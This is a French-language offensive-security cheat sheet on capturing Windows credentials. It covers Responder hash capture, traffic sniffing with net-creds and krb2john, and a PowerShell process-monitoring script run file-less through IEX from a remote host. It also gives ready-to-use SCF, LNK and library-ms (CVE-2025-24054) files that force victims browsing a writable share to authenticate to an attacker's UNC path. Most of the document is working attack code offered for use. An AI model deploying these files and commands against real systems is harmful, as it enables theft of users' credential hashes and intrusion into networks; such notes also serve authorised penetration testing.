
- [[#Capture du hash NTLM]]
- [[#Sniffing Wireshark / Net-Creds]]
- [[#Process Command Lines]]
- [[#SCF Files (Shell Command File) (Pre 2019)]]
- [[#LNK Files (Pre / Post 2019)]]
- [[#Library-MS Files (CVE-2025-24054)]]


---
# Capture du hash NTLM

Si besoin de récupérer le hash de l'utilisateur actuel

1. Lancer responder pour capturer les hash

```shell
sudo responder -wrf -v -I tun0
```

2. Pointer vers le partage SMB depuis la cible

```
\\<ip-attacker>\share\
```



---
# Sniffing Wireshark / Net-Creds


Lancer Wireshark / Tcpdump afin de capturer le trafic.

/

Lancer net-creds afin de capturer le trafic et d'identifier tous les identifiants en clair https://github.com/DanMcInerney/net-creds

Si authent kerberos capturée, possible de mettre au format john.

d'abord mettre le pcap au format pdml avec tshark.

```
tshark -r  WS-01_PktMon.pcap -T pdml > output.pdml
```

puis krb2john

```
$ krb2john output.pdml
```

attention au realm qui peut ne pas être au bon format (domain au lieu de domain.local)




---

# Process Command Lines

> [!TIP]
> Identifier les taches planifiés / processus exécutés en lignes de commandes et peut reveler mots de passe en clair.


Script Powershell qui check en direct toutes les 2 secondes

```shell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

run en file-less

```powershell-session
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```



---

# SCF Files (Shell Command File) (Pre 2019)

> [!TIP]
> Un fichier SCF permet d'éxécuter des commandes windows, il est possible de faire pointer l'icone du fichier vers un UNC path et donc capturer les hash NTLM avec Responder en pointant vers notre partage. Le fichier est automatiquement executé lorsqu'un user consulte le dossier dans lequel il se trouve.

> [!TIP]
> A placer dans un share writable

@Inventory.scf

```shell
[Shell]
Command=2
IconFile=\\<ip-attacker>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

1. Créer le fichier ci-dessus et le placer dans un partage utilisé par les utilisateurs.

2. Lancer responder pour capturer les hash

```shell
sudo responder -wrf -v -I tun0
```



---

# LNK Files (Pre / Post 2019)

> [!tip]
> Similaire aux fichiers SCF

> [!TIP]
> A placer dans un share writable


Script Powershelll pour créer le fichier .lnk

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

ou

https://github.com/dievus/lnkbomb

2. Lancer responder pour capturer les hash

```shell
sudo responder -w -v -I tun0
```

---

# Library-MS Files (CVE-2025-24054)

> [!tip]
> Similaire aux LNK et SCF


1. fichier .library-ms

```bash
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<ip_attacker>\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```


2. Compresser le fichier dans un rar/zip

3. Lancer responder pour capturer les hash

```shell
sudo responder -wrf -v -I tun0
```

4. Capture du hash à la decompression